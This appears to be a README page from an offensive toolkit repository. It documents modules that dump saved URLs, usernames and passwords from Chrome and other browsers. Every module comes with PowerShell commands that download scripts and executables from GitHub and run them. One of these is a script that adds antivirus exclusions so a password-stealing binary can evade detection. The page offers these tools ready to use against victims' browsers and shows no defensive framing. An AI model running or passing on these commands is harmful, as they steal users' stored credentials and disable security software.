## Module Name
   <b><i>DumpChromePasswords.ps1</i></b>

|Cmdlet Name|Description|Privileges|Notes|
|---|---|---|---|
|DumpChromePasswords|dumps URLs, usernames, and passwords from Chrome.|User Land|Only dumps chrome browser|

```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/DumpChromePasswords.ps1" -OutFile "DumpChromePasswords.ps1"
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/sqlite-netFx40-static-binary-bundle-x64-2010-1.0.113.0.zip" -OutFile "sqlite-netFx40-static-binary-bundle-x64-2010-1.0.113.0.zip"
```

**prerequisites:**
``` 
   1. You must have the System.Data.SQLite.dll handy (see below)
   2. Your database must be accessible (close Chrome, or make some copy)
   3. It must by your database. If Chrome cannot open it, the script will probably fail as well.
```

```powershell
.\DumpChromePasswords.ps1
```

<br />


## Module Name
   <b><i>HarvestBrowserPasswords.exe</i></b>

|Binary Name|Description|Privileges|Notes|
|---|---|---|---|
|HarvestBrowserPasswords|dumps URLs, usernames, and passwords from major browsers.|User Land|Dumps major browsers|

```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/HarvestBrowserPasswords.exe" -OutFile "HarvestBrowserPasswords.exe"
```

```powershell
.\HarvestBrowserPasswords.exe -a, --all
.\HarvestBrowserPasswords.exe -f, --firefox
.\HarvestBrowserPasswords.exe -c, --chrome
```

<br />


## Module Name
   <b><i>ChromePass.exe - UNDER-DEVELOP (NOT-STABLE)</i></b>
   
|Binary Name|Description|Privileges|Notes|
|---|---|---|---|
|ChromePass|dumps usernames, passwords from chrome|Administrator|Invoke-ExclusionExtension.ps1 downloads\evade AV|

```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/BypassAV/Invoke-ExclusionExtension.ps1" -OutFile "Invoke-ExclusionExtension.ps1"
```

```powershell
Get-help .\Invoke-ExclusionExtension.ps1 -Force

.\Invoke-ExclusionExtension.ps1 -action 'add' -Extension 'exe' -Directory '#Env:TMP'
.\Invoke-ExclusionExtension.ps1 -action 'exe' -Uri 'https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.exe' -Extension 'exe'
.\Invoke-ExclusionExtension.ps1 -action 'del' -Extension 'exe'
```
